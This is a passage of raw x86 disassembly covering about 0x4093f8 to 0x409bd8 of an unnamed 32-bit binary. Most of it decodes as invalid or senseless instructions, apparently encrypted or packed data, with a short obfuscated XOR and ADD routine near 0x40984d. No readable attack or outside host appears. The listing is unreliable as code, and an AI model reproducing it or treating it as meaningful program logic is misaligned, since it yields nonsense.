  4093f8:	or     DWORD PTR [edx+edi*8+0x16],ecx
  4093fc:	pop    edi
  4093fd:	aas    
  4093fe:	icebp  
  4093ff:	mov    eax,ds:0x575c54ea
  409404:	sub    DWORD PTR [eax+0x20],ecx
  409407:	jbe    0x4093dd
  409409:	pop    DWORD PTR [eax+0x3]
  40940c:	push   ebx
  40940d:	or     al,0xf
  40940f:	mov    ch,BYTE PTR [ecx]
  409411:	or     al,0x1d
  409413:	shl    DWORD PTR [edi],cl
  409415:	retf   0x3d99
  409418:	popa   
  409419:	push   ecx
  40941a:	mov    ebx,DWORD PTR [ebp+0x1a]
  40941d:	popf   
  40941e:	test   ebx,ecx
  409420:	pop    es
  409421:	fst    QWORD PTR [ecx+0x77]
  409424:	mov    fs,WORD PTR [eax]
  409426:	and    al,0xb0
  409428:	outs   dx,BYTE PTR ds:[esi]
  409429:	(bad)  [ecx-0x3e061d70]
  40942f:	push   ebx
  409430:	cld    
  409431:	adc    edx,DWORD PTR [ebp-0x36]
  409434:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409435:	out    dx,eax
  409436:	repnz and dl,ah
  409439:	mov    esi,0x52e0937c
  40943e:	ins    DWORD PTR es:[edi],dx
  40943f:	addr16 pushf 
  409441:	and    BYTE PTR [edi+0x21],dh
  409444:	shr    eax,0xab
  409447:	sbb    BYTE PTR [ecx+0x1b],ah
  40944a:	outs   dx,BYTE PTR ds:[esi]
  40944b:	push   es
  40944c:	mov    ebp,0x777f2688
  409451:	push   0x28e8af8e
  409456:	cmp    eax,DWORD PTR [eax-0x264c366b]
  40945c:	je     0x4094c0
  40945e:	sti    
  40945f:	inc    edi
  409460:	pop    esp
  409461:	jecxz  0x40942c
  409463:	loope  0x4094e4
  409465:	ja     0x4094d9
  409467:	rcr    BYTE PTR [edi],cl
  409469:	jmp    0x40946a
  40946b:	aad    0x38
  40946d:	or     eax,0xdf751fb0
  409472:	pop    ecx
  409473:	inc    esi
  409474:	int3   
  409475:	xor    eax,0x446623ea
  40947a:	pop    ss
  40947b:	popf   
  40947c:	push   ss
  40947d:	pop    ebx
  40947e:	push   esi
  40947f:	scas   eax,DWORD PTR es:[edi]
  409480:	push   es
  409481:	jbe    0x409492
  409483:	mov    al,bh
  409485:	sar    ecx,cl
  409487:	and    DWORD PTR [ebx+0x4b],ebp
  40948a:	push   DWORD PTR ds:0x742bfa9a
  409490:	in     al,0x35
  409492:	sub    DWORD PTR [edi+0x60],0x88f1ebae
  409499:	shl    DWORD PTR [ebp-0x188b68a8],cl
  40949f:	ja     0x409471
  4094a1:	sub    eax,0x9561c0e
  4094a6:	int3   
  4094a7:	js     0x40947c
  4094a9:	xchg   ebx,eax
  4094aa:	xchg   ebx,eax
  4094ab:	dec    ebp
  4094ac:	retf   0x5f0e
  4094af:	inc    BYTE PTR [ecx]
  4094b1:	hlt    
  4094b2:	push   ss
  4094b3:	pop    ss
  4094b4:	cmp    DWORD PTR [ebx],0xe6ca1529
  4094ba:	mov    BYTE PTR [ebx],ch
  4094bc:	sbb    BYTE PTR [ecx-0x38d23ebc],dl
  4094c2:	xchg   ecx,eax
  4094c3:	cmp    dl,cl
  4094c5:	dec    ebp
  4094c6:	test   BYTE PTR [ebx+0x67],0x3e
  4094ca:	aaa    
  4094cb:	push   cs
  4094cc:	ffreep st(6)
  4094ce:	in     al,dx
  4094cf:	jns    0x409510
  4094d1:	(bad)  
  4094d2:	pusha  
  4094d3:	pop    es
  4094d4:	xor    al,0xcb
  4094d6:	shr    DWORD PTR [edx-0x2e],cl
  4094d9:	cmp    eax,ecx
  4094db:	pop    ebx
  4094dc:	ret    0x645b
  4094df:	popa   
  4094e0:	js     0x4094b8
  4094e2:	xor    eax,0xda6c8ec3
  4094e7:	sar    BYTE PTR [eax+eax*4-0x63190c2],0xed
  4094ef:	mov    cl,0x87
  4094f1:	jmp    0x47ba1f66
  4094f6:	aas    
  4094f7:	cmp    al,0x78
  4094f9:	and    al,dl
  4094fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094fc:	int3   
  4094fd:	push   ebx
  4094fe:	leave  
  4094ff:	out    dx,eax
  409500:	fwait
  409501:	aaa    
  409502:	in     al,dx
  409503:	sub    ebp,DWORD PTR [edx]
  409505:	adc    BYTE PTR ds:0x79fdb15c,bh
  40950b:	dec    esp
  40950c:	mov    bl,0x12
  40950e:	pop    ecx
  40950f:	and    ah,BYTE PTR [edx-0x70]
  409512:	cmp    ebx,edi
  409514:	cld    
  409515:	mov    esp,0xf1554da
  40951a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40951b:	pop    edx
  40951c:	inc    ebx
  40951d:	or     ah,BYTE PTR [ebx+0x39c561f9]
  409523:	loope  0x40950b
  409525:	scas   eax,DWORD PTR es:[edi]
  409526:	sub    eax,0x9a97d852
  40952b:	xchg   BYTE PTR [eax],bl
  40952d:	or     eax,0x3383ad95
  409532:	pop    es
  409533:	push   ebp
  409534:	je     0x4094c0
  409536:	mov    bl,0xbf
  409538:	inc    ecx
  409539:	inc    ecx
  40953a:	fild   DWORD PTR [ecx+ebp*2-0xa9a19bf]
  409541:	scas   eax,DWORD PTR es:[edi]
  409542:	mov    bh,0xb8
  409544:	fcomp  QWORD PTR [ebx]
  409546:	mov    eax,ds:0x41e0f8e5
  40954b:	sub    BYTE PTR [esi],0xe7
  40954e:	ins    BYTE PTR es:[edi],dx
  40954f:	scas   al,BYTE PTR es:[edi]
  409550:	aam    0x90
  409552:	push   cs
  409553:	push   0xf
  409555:	cmp    DWORD PTR [ecx],edx
  409557:	jb     0x409527
  409559:	rcl    DWORD PTR [edx],0xb5
  40955c:	fild   QWORD PTR [ecx+edi*8-0x3c]
  409560:	xor    ebx,DWORD PTR [edi-0x45]
  409563:	inc    edi
  409564:	test   BYTE PTR [ebp-0x78],bl
  409567:	mov    ebx,0x9a494523
  40956c:	mov    eax,edi
  40956e:	call   FWORD PTR [edi+edi*8]
  409571:	mov    bh,0x49
  409573:	out    dx,eax
  409574:	into   
  409575:	cmp    dl,BYTE PTR [ecx-0x4da6dfa]
  40957b:	push   cs
  40957c:	(bad)  
  40957d:	shl    BYTE PTR [esi-0x7abd8854],cl
  409583:	xlat   BYTE PTR ds:[ebx]
  409584:	sbb    eax,0x17402d2
  409589:	lods   eax,DWORD PTR ds:[esi]
  40958a:	push   eax
  40958b:	and    BYTE PTR [ecx-0x35],bl
  40958e:	and    dl,BYTE PTR [ebx+0x7c]
  409591:	xchg   edi,eax
  409592:	sbb    cl,BYTE PTR [ebx+0x2f]
  409595:	adc    DWORD PTR [ecx+0x77cf3b08],0x15
  40959c:	mov    ds,esi
  40959e:	sub    ebx,ebp
  4095a0:	xor    al,0xa9
  4095a2:	mov    WORD PTR [ebp+0x3a],es
  4095a5:	int    0xdc
  4095a7:	sahf   
  4095a8:	call   0xa0e8:0x1788d0b7
  4095af:	xchg   esi,eax
  4095b0:	shl    DWORD PTR [eax+esi*8],0xcd
  4095b4:	fmul   QWORD PTR [edx]
  4095b6:	pop    esi
  4095b7:	int    0x6a
  4095b9:	ficom  DWORD PTR [eax+esi*2]
  4095bc:	xchg   ebp,eax
  4095bd:	pop    ebx
  4095be:	jno    0x409634
  4095c0:	rcr    DWORD PTR [ebx*4+0x5ab81f72],0x60
  4095c8:	xchg   edx,eax
  4095c9:	sub    al,0x7e
  4095cb:	ret    
  4095cc:	jnp    0x4095f9
  4095ce:	cmp    eax,0x3af65239
  4095d3:	loope  0x40962c
  4095d5:	xchg   esp,eax
  4095d6:	xor    BYTE PTR [edx+0x75e35fe6],0x93
  4095dd:	cwde   
  4095de:	(bad)  
  4095df:	stc    
  4095e0:	aad    0x8d
  4095e2:	sbb    BYTE PTR [eax],cl
  4095e4:	dec    eax
  4095e5:	sbb    bh,bl
  4095e7:	cmp    DWORD PTR [ebx-0x2adf177e],ebp
  4095ed:	(bad)  
  4095ee:	(bad)  
  4095ef:	jmp    0x409836
  4095f4:	loope  0x40958c
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8ec6:0x461a784e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	aas    
  40960d:	call   0xd92bc29c
  409612:	adc    al,0x1
  409614:	sahf   
  409615:	cdq    
  409616:	enter  0xf650,0xdd
  40961a:	jl     0x40963c
  40961c:	test   eax,0xf41f89ba
  409621:	jge    0x40968b
  409623:	test   eax,0x89b752c4
  409628:	pop    esp
  409629:	mov    ecx,0xac46cd00
  40962e:	mov    edx,0x95a8adef
  409633:	jnp    0x409605
  409635:	adc    al,0xbe
  409637:	fldenv [edx]
  409639:	cdq    
  40963a:	dec    esp
  40963b:	adc    ebp,DWORD PTR ds:0x7308f655
  409641:	ins    BYTE PTR es:[edi],dx
  409642:	push   ebx
  409643:	push   ebx
  409644:	int    0xe2
  409646:	inc    ecx
  409647:	aam    0xcf
  409649:	xchg   BYTE PTR [edx+0x7b],bh
  40964c:	stc    
  40964d:	sub    BYTE PTR [ecx],bh
  40964f:	pop    es
  409650:	xchg   edi,eax
  409651:	aad    0x52
  409653:	mov    edx,0x978bec4c
  409658:	shr    DWORD PTR [eax],cl
  40965a:	pushf  
  40965b:	pop    eax
  40965c:	push   edi
  40965d:	mov    eax,ds:0xfb98b4cb
  409662:	daa    
  409663:	cmp    al,0x49
  409665:	aaa    
  409666:	push   cs
  409667:	jl     0x4096d4
  409669:	fs (bad) 
  40966b:	sbb    BYTE PTR [esi+0x49],0xfa
  40966f:	sub    BYTE PTR [ebx+0x54],dl
  409672:	fwait
  409673:	jl     0x40964d
  409675:	adc    DWORD PTR [eax-0x1f751553],eax
  40967b:	ss add ecx,esi
  40967e:	(bad)  
  40967f:	mov    ecx,0x2d577408
  409684:	dec    esi
  409685:	inc    eax
  409686:	or     eax,0xc832408d
  40968b:	(bad)  
  40968c:	hlt    
  40968d:	aam    0xe1
  40968f:	dec    ecx
  409690:	out    dx,eax
  409691:	mov    edi,0xc2de5b17
  409696:	shl    DWORD PTR [edi],0x53
  409699:	mov    esp,0xb0f96482
  40969e:	sbb    ah,ch
  4096a0:	inc    ecx
  4096a1:	pop    ds
  4096a2:	call   0x315c:0x3d3f40d5
  4096a9:	(bad)  
  4096aa:	add    BYTE PTR [ebx],0x8a
  4096ad:	pop    esp
  4096ae:	cmp    BYTE PTR [ecx],ah
  4096b0:	mov    eax,0x85e1603c
  4096b5:	les    ecx,FWORD PTR [edi]
  4096b7:	xor    eax,edi
  4096b9:	jno    0x40970a
  4096bb:	or     edx,DWORD PTR [edi+0x64b5ce4d]
  4096c1:	daa    
  4096c2:	sbb    BYTE PTR [edi],cl
  4096c4:	ret    0xa4ab
  4096c7:	js     0x4096c8
  4096c9:	les    esp,FWORD PTR [edi+0x32]
  4096cc:	mov    ebx,0x2da6c98a
  4096d1:	push   ecx
  4096d2:	sbb    al,0x65
  4096d4:	rcl    BYTE PTR [ebx+0x60e0ea8b],1
  4096da:	(bad)
  4096de:	xor    eax,0xc1abc78f
  4096e3:	pavgw  mm1,QWORD PTR [esi-0x56]
  4096e7:	cwde   
  4096e8:	dec    edi
  4096e9:	mov    DWORD PTR [esi],0x81ea039b
  4096ef:	inc    eax
  4096f0:	lea    ecx,[ecx+0x72]
  4096f3:	xchg   ecx,eax
  4096f4:	dec    eax
  4096f5:	fs mov ch,0x16
  4096f8:	ror    DWORD PTR [ecx+0x2d],1
  4096fb:	add    ch,BYTE PTR [esi+0x4c31b2a0]
  409701:	stc    
  409702:	pop    esp
  409703:	xor    ecx,DWORD PTR ds:0x1a40df24
  409709:	push   es
  40970a:	cdq    
  40970b:	pxor   mm2,QWORD PTR [ebp-0x7f]
  40970f:	not    edx
  409711:	clc    
  409712:	je     0x4096be
  409714:	sub    DWORD PTR [edx],esi
  409716:	fcmovnbe st,st(6)
  409718:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409719:	xor    dh,BYTE PTR [ecx]
  40971b:	mov    edi,0xac0a3d2f
  409720:	aaa    
  409721:	call   0xa13916ae
  409726:	lods   al,BYTE PTR ds:[esi]
  409727:	fidiv  DWORD PTR [edx+ecx*8-0x6a9b5bc8]
  40972e:	adc    al,0xec
  409730:	inc    esi
  409731:	pop    ebp
  409732:	std    
  409733:	neg    BYTE PTR [edx]
  409735:	mov    gs,WORD PTR [ecx+ecx*8]
  409738:	call   0x6d39ce0f
  40973d:	mov    eax,0x8d47ea53
  409742:	adc    BYTE PTR [edx-0x78c93dd0],bh
  409748:	call   FWORD PTR [esi-0x5495b176]
  40974e:	inc    eax
  40974f:	push   esi
  409750:	lods   eax,DWORD PTR ds:[esi]
  409751:	loop   0x409760
  409753:	jns    0x40970b
  409755:	and    al,0x88
  409757:	das    
  409758:	gs sti 
  40975a:	push   eax
  40975b:	fnstenv [esi-0x31319f36]
  409761:	pop    ds
  409762:	dec    edx
  409763:	mov    ch,0xbf
  409765:	xor    DWORD PTR [edi+0x618d29e4],edx
  40976b:	adc    DWORD PTR ds:0xd88e2fb5,ecx
  409771:	xchg   BYTE PTR [esi+0xf969c51],cl
  409777:	out    0x36,al
  409779:	jle    0x4097d7
  40977b:	push   esi
  40977c:	or     DWORD PTR [ecx-0x7b],edx
  40977f:	cmp    ch,al
  409781:	push   es
  409782:	mov    eax,esp
  409784:	pop    edx
  409785:	add    eax,0x3561b4e7
  40978a:	nop
  40978b:	push   0x19
  40978d:	dec    ebx
  40978e:	xchg   ebx,esi
  409790:	jbe    0x409782
  409792:	repz stc 
  409794:	clc    
  409795:	dec    eax
  409796:	outs   dx,DWORD PTR ds:[esi]
  409797:	repnz xor ah,BYTE PTR [ebx-0x25]
  40979b:	test   BYTE PTR [edx-0x65],ch
  40979e:	push   ss
  40979f:	cmp    BYTE PTR [eax],ah
  4097a1:	lds    ebx,FWORD PTR [ecx-0x581406ef]
  4097a7:	cmp    bl,al
  4097a9:	leave  
  4097aa:	(bad)  [eax+0x4b5b718e]
  4097b0:	outs   dx,DWORD PTR ds:[esi]
  4097b1:	push   ecx
  4097b2:	sub    DWORD PTR [ebp+esi*8-0x5a6d831f],0xffffffb6
  4097ba:	ins    BYTE PTR es:[edi],dx
  4097bb:	mov    esi,fs
  4097bd:	popf   
  4097be:	xor    cl,BYTE PTR [eax-0x2a]
  4097c1:	mov    dh,0xd6
  4097c3:	add    al,bl
  4097c5:	xchg   ebp,eax
  4097c6:	add    al,0x73
  4097c8:	pop    esp
  4097c9:	pop    ss
  4097ca:	popf   
  4097cb:	xchg   ecx,eax
  4097cc:	jbe    0x40978b
  4097ce:	daa    
  4097cf:	(bad)  
  4097d0:	cmp    al,0x40
  4097d2:	pop    esi
  4097d3:	sbb    eax,0xfdcf1779
  4097d8:	clc    
  4097d9:	and    BYTE PTR [esi-0x71f02f41],0xcb
  4097e0:	fistp  WORD PTR [ecx]
  4097e2:	ins    DWORD PTR es:[edi],dx
  4097e3:	lea    esp,[edi+0x57fbb077]
  4097e9:	pop    ss
  4097ea:	ret    
  4097eb:	push   0x61a0c46b
  4097f0:	imul   al
  4097f2:	leave  
  4097f3:	ficomp WORD PTR cs:[esi]
  4097f6:	inc    esp
  4097f7:	fsubr  st(4),st
  4097f9:	pop    es
  4097fa:	ficomp WORD PTR [di+0x3d48]
  4097ff:	shl    DWORD PTR [edx+0x4],0xea
  409803:	enter  0xae74,0xb7
  409807:	or     DWORD PTR [edi],0x8da8bd9e
  40980d:	add    DWORD PTR [ebp+0x41bd0acf],edi
  409813:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409814:	fidivr WORD PTR [edi]
  409816:	hlt    
  409817:	mov    bh,0xac
  409819:	ins    DWORD PTR es:[edi],dx
  40981a:	pop    ecx
  40981b:	leave  
  40981c:	pop    ebx
  40981d:	mov    dl,0xf5
  40981f:	lds    edi,FWORD PTR [edx-0xa47a31]
  409825:	lahf   
  409826:	leave  
  409827:	sti    
  409828:	cmp    BYTE PTR ds:0xb3593cfc,al
  40982e:	sub    ch,BYTE PTR [edx-0x2]
  409831:	shl    ch,cl
  409833:	or     DWORD PTR [edi+edi*1+0x3bf4458b],esi
  40983a:	ret    
  40983b:	je     0x40892f
  409841:	mov    eax,DWORD PTR [ebp-0x8]
  409844:	mov    eax,DWORD PTR [eax]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x43385f
  40986f:	xor    DWORD PTR ds:0x433797,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x43385b,0x43382b
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x4337e7,0x433893
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x43377b
  4098a6:	sub    DWORD PTR ds:0x43385f,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	call   0x7ed9:0xb41c8074
  4098c7:	jle    0x409901
  4098c9:	jl     0x409949
  4098cb:	jle    0x40994c
  4098cd:	enter  0x3112,0x58
  4098d1:	mov    al,0x16
  4098d3:	aaa    
  4098d4:	push   eax
  4098d5:	lock loop 0x40989b
  4098d8:	fild   WORD PTR [esi]
  4098da:	mov    ebp,0x75b68a35
  4098df:	or     ebx,DWORD PTR [edi]
  4098e1:	neg    bl
  4098e3:	and    dl,BYTE PTR [edx]
  4098e5:	cmc    
  4098e6:	sub    eax,0x97ddd828
  4098eb:	inc    ecx
  4098ec:	mov    al,ds:0xdfaebec2
  4098f1:	sub    esi,DWORD PTR [ebx+0x4b]
  4098f4:	in     al,dx
  4098f5:	dec    ecx
  4098f6:	lods   eax,DWORD PTR ds:[esi]
  4098f7:	imul   esp,DWORD PTR [esi+0x1b],0xfd805499
  4098fe:	dec    edx
  409900:	out    dx,eax
  409901:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409902:	xor    ch,BYTE PTR [esi-0x56]
  409905:	stc    
  409906:	jle    0x40995c
  409908:	ret    0x3983
  40990b:	inc    esi
  40990c:	gs xor eax,0x3bfcfde7
  409912:	sub    cl,BYTE PTR [ecx+0x5d]
  409915:	in     al,dx
  409916:	js     0x4098ed
  409918:	xchg   BYTE PTR [ebp+0xf],dh
  40991b:	mov    esp,DWORD PTR [edx+0x55211623]
  409921:	test   BYTE PTR [ebx],bl
  409923:	repnz dec edx
  409925:	imul   edi,DWORD PTR ds:[ebp-0x7fffd92d],0xfffffff5
  40992d:	test   al,0xb7
  40992f:	dec    edx
  409930:	xchg   edx,eax
  409931:	xchg   DWORD PTR [edi-0x79],edx
  409934:	dec    DWORD PTR [ebp-0x18412c72]
  40993a:	inc    ecx
  40993b:	add    BYTE PTR [esi],dh
  40993d:	cmp    al,0xa9
  40993f:	rcr    DWORD PTR [esi+eiz*1],1
  409942:	adc    dh,BYTE PTR [edx+0x4c9898d2]
  409948:	or     eax,0xdceeed7f
  40994d:	push   edi
  40994e:	xor    dh,BYTE PTR [ebx-0x132fb2f3]
  409954:	sub    edi,0xffffff89
  409957:	jb     0x409924
  409959:	rcr    ah,0x5a
  40995c:	(bad)  
  40995d:	push   ds
  40995e:	sub    al,ah
  409960:	sahf   
  409961:	pushf  
  409962:	adc    BYTE PTR [ecx],al
  409964:	retf   
  409965:	and    BYTE PTR [edi-0x65],bh
  409968:	sub    al,0x30
  40996a:	push   ecx
  40996b:	adc    eax,0x4c8a2a00
  409970:	loop   0x409972
  409972:	xchg   esi,eax
  409973:	and    DWORD PTR [edi-0x6fdc0965],esp
  409979:	(bad)  
  40997a:	mov    ds:0x8f478658,al
  40997f:	inc    esp
  409980:	clc    
  409981:	xor    DWORD PTR ds:0xc8f067b9,0x70
  409988:	cwde   
  409989:	enter  0xa43d,0x38
  40998d:	inc    ebx
  40998e:	arpl   WORD PTR [edi-0x43fa1c0c],bx
  409994:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409995:	retf   
  409996:	jno    0x4099f7
  409998:	mov    al,ds:0x8446afc8
  40999d:	sti    
  40999e:	pop    ss
  40999f:	mov    ch,0x39
  4099a1:	inc    esi
  4099a2:	lds    eax,FWORD PTR [esi]
  4099a4:	not    ah
  4099a6:	pop    ebx
  4099a7:	rcl    BYTE PTR [edi],cl
  4099a9:	loop   0x4099cd
  4099ab:	adc    ebx,DWORD PTR [ebp-0x41]
  4099ae:	jecxz  0x4099a5
  4099b0:	push   eax
  4099b1:	xchg   ecx,eax
  4099b2:	pop    DWORD PTR [esp+ebx*8]
  4099b5:	in     al,dx
  4099b6:	jecxz  0x4099f4
  4099b8:	jb     0x4099f2
  4099ba:	lods   al,BYTE PTR ds:[esi]
  4099bb:	xlat   BYTE PTR ds:[ebx]
  4099bc:	ja     0x4099d1
  4099be:	jle    0x4099e4
  4099c0:	dec    eax
  4099c1:	sub    DWORD PTR [edi+0x1],ebp
  4099c4:	stos   DWORD PTR es:[edi],eax
  4099c5:	mov    cl,0xe0
  4099c7:	jmp    0xdf16:0x601ab12
  4099ce:	xchg   ecx,eax
  4099cf:	push   esp
  4099d0:	adc    DWORD PTR [edx-0x429bc3c7],ebp
  4099d6:	mov    edx,0x9d5538d2
  4099db:	push   es
  4099dc:	cdq    
  4099dd:	push   esp
  4099de:	addr16 aad 0x2a
  4099e1:	push   esp
  4099e2:	fild   QWORD PTR [edx-0x71e83749]
  4099e8:	mov    DWORD PTR ds:0x4c068edf,edi
  4099ee:	inc    edi
  4099ef:	inc    ecx
  4099f0:	loope  0x4099f6
  4099f2:	bound  ebx,QWORD PTR [edi+0x73]
  4099f5:	(bad)  
  4099f6:	pop    ebp
  4099f7:	push   ecx
  4099f8:	(bad)  
  4099f9:	cmc    
  4099fa:	fidiv  DWORD PTR [esi]
  4099fc:	sar    BYTE PTR [edi-0x14],0xe7
  409a00:	dec    esi
  409a01:	fnsave [edi+0x3402e7b7]
  409a07:	ds mov edi,0x5f3138ca
  409a0d:	adc    ecx,edx
  409a0f:	test   BYTE PTR [ecx],ah
  409a11:	pop    es
  409a12:	daa    
  409a13:	sub    BYTE PTR [edi-0x3ec8fb7c],ch
  409a19:	xchg   ebp,eax
  409a1a:	(bad)  
  409a1b:	xor    al,0x20
  409a1d:	jmp    0x409a74
  409a1f:	sti    
  409a20:	aas    
  409a21:	in     eax,0x84
  409a23:	jge    0x4099e2
  409a25:	cmp    BYTE PTR [ebx+0x2344ce7f],bl
  409a2b:	popf   
  409a2c:	dec    ecx
  409a2d:	inc    esp
  409a2e:	sub    BYTE PTR [eax+0x6a],bh
  409a31:	push   ebx
  409a32:	outs   dx,DWORD PTR ds:[esi]
  409a33:	mov    ch,0xd0
  409a35:	pop    ss
  409a36:	fcmovnu st,st(6)
  409a38:	mov    ebp,0xb336abbb
  409a3d:	loop   0x4099cf
  409a3f:	mov    ah,0x5e
  409a41:	push   esp
  409a42:	mov    ebp,0x81f74860
  409a47:	mov    dl,0x8f
  409a49:	outs   dx,BYTE PTR ds:[esi]
  409a4a:	or     BYTE PTR [esi],ah
  409a4c:	xchg   esi,eax
  409a4d:	or     bl,al
  409a4f:	jle    0x4099d4
  409a51:	add    eax,0x71
  409a54:	mov    eax,ds:0x15eba2dc
  409a59:	retf   0x4c4f
  409a5c:	cmp    al,0xc
  409a5e:	mov    DWORD PTR [edx-0x7e],esi
  409a61:	jne    0x409a45
  409a63:	xchg   edx,eax
  409a64:	je     0x4099fe
  409a66:	pop    esi
  409a67:	xor    eax,0x5f17e343
  409a6c:	test   al,0xc9
  409a6e:	cmp    ah,dh
  409a70:	clc    
  409a71:	xlat   BYTE PTR ds:[ebx]
  409a72:	cmp    DWORD PTR [edx],esp
  409a74:	mov    es,WORD PTR [eax-0x2a541406]
  409a7a:	adc    ah,BYTE PTR [edi-0xb]
  409a7d:	outs   dx,DWORD PTR ds:[esi]
  409a7e:	jg     0x409ae6
  409a80:	out    dx,eax
  409a81:	call   0x15fa207d
  409a86:	imul   ebp,DWORD PTR [eax],0xffffffdf
  409a89:	aaa    
  409a8a:	cld    
  409a8b:	div    BYTE PTR [ebp-0x2ecba6b5]
  409a91:	rcl    DWORD PTR [esi+0x4c],cl
  409a94:	int3   
  409a95:	test   BYTE PTR [ebx+0x5a78b574],0xcf
  409a9c:	sub    DWORD PTR [esi+0x53a02732],esp
  409aa2:	das    
  409aa3:	(bad)  
  409aa4:	push   ecx
  409aa5:	xchg   ecx,eax
  409aa6:	mov    ebp,0xc110a8cb
  409aab:	iret   
  409aac:	add    DWORD PTR [edi-0x3a47dfde],ebp
  409ab2:	jmp    0x409a64
  409ab4:	and    eax,0xfdfd3918
  409ab9:	(bad)  
  409aba:	mov    ch,0xf6
  409abc:	(bad)
  409abf:	aad    0xbd
  409ac1:	push   0xfffffff7
  409ac3:	sub    BYTE PTR [edi+0x30],0x83
  409ac7:	fild   DWORD PTR [ebx+0x24157e08]
  409acd:	fprem1 
  409acf:	gs fucomp st(7)
  409ad2:	sbb    eax,0x6e93d027
  409ad7:	ret    
  409ad8:	ds ja  0x409a82
  409adb:	dec    ebp
  409adc:	(bad)  
  409add:	iret   
  409ade:	sub    ah,BYTE PTR [edi+ecx*2]
  409ae1:	mov    ebp,0xbd0900b3
  409ae6:	xchg   edi,eax
  409ae7:	test   DWORD PTR [edx-0x47e9b3b7],esp
  409aed:	adc    al,0x36
  409aef:	fsubr  QWORD PTR [ebx]
  409af1:	loopne 0x409ac2
  409af3:	lea    esi,[edx]
  409af5:	sub    eax,0x1c6f2ccc
  409afa:	scas   al,BYTE PTR es:[edi]
  409afb:	xlat   BYTE PTR ds:[ebx]
  409afc:	(bad)  [ebx+0x44]
  409aff:	cld    
  409b00:	mov    ecx,0x1982e690
  409b05:	lds    esi,FWORD PTR [edi]
  409b07:	outs   dx,BYTE PTR ds:[esi]
  409b08:	add    dh,cl
  409b0a:	fs pop es
  409b0c:	aaa    
  409b0d:	scas   al,BYTE PTR es:[edi]
  409b0e:	xor    eax,0x561480a9
  409b13:	push   edi
  409b14:	sbb    DWORD PTR ds:0x43381f,0x4337d3
  409b1e:	jmp    0x409d81
  409b23:	lds    esp,FWORD PTR [edi-0x2e932d54]
  409b29:	popa   
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi+0x1e9695d4]
  409b32:	and    edi,DWORD PTR [esi-0x1c]
  409b35:	jle    0x409bb5
  409b37:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409b3b:	cmp    BYTE PTR [esi+0x57d3ac40],dh
  409b41:	sbb    eax,0xfc215ff5
  409b46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b47:	pop    eax
  409b48:	adc    esi,DWORD PTR [edi-0x6b]
  409b4b:	(bad)
  409b4e:	or     ah,BYTE PTR [edi-0x456a0436]
  409b54:	cmp    DWORD PTR [eax],ecx
  409b56:	push   ss
  409b57:	adc    BYTE PTR [esi-0x630c35ff],0xe9
  409b5e:	sbb    ebx,DWORD PTR [edi]
  409b60:	xchg   ebx,eax
  409b61:	sub    DWORD PTR [ebp+ebx*2-0x69],ebx
  409b65:	adc    eax,ebp
  409b67:	outs   dx,BYTE PTR ds:[esi]
  409b68:	push   ss
  409b69:	xor    eax,0x858883ea
  409b6e:	mov    bl,BYTE PTR [ecx-0x659c91a9]
  409b74:	test   DWORD PTR [esi+0x7de61806],eax
  409b7a:	cmp    BYTE PTR [esi-0x32834c2e],dh
  409b80:	aas    
  409b81:	cmp    eax,0x4faa07e0
  409b86:	mov    edi,0x181b91f1
  409b8b:	lea    esp,[ebx]
  409b8d:	cmp    edx,ebp
  409b8f:	jecxz  0x409bc8
  409b91:	or     cl,bh
  409b93:	pop    esp
  409b94:	inc    edx
  409b95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b96:	jno    0x409be5
  409b98:	(bad)  
  409b99:	ins    BYTE PTR es:[edi],dx
  409b9a:	outs   dx,DWORD PTR ds:[esi]
  409b9b:	sbb    al,0x7c
  409b9d:	js     0x409c02
  409b9f:	mov    bl,0x29
  409ba1:	ss pop ds
  409ba3:	or     ebp,DWORD PTR [ecx+0x56f0e92e]
  409ba9:	sbb    bl,0x9c
  409bac:	mov    ebp,0xd67bc70b
  409bb1:	xchg   edx,eax
  409bb2:	sub    DWORD PTR [edi+0xd],esi
  409bb5:	jbe    0x409c23
  409bb7:	aaa    
  409bb8:	jae    0x409c0c
  409bba:	out    0x6d,al
  409bbc:	dec    esi
  409bbd:	mov    cl,0xfe
  409bbf:	fnstsw WORD PTR [eax-0x213aea67]
  409bc5:	stos   BYTE PTR es:[edi],al
  409bc6:	cld    
  409bc7:	add    edx,esp
  409bc9:	jmp    0xc82fb30f
  409bce:	lds    esp,FWORD PTR [eax+eiz*2]
  409bd1:	xlat   BYTE PTR ds:[ebx]
  409bd2:	push   ecx
  409bd3:	mov    WORD PTR [ecx],ds
  409bd5:	rcr    DWORD PTR [ecx],0x7
  409bd8:	aad    0xec
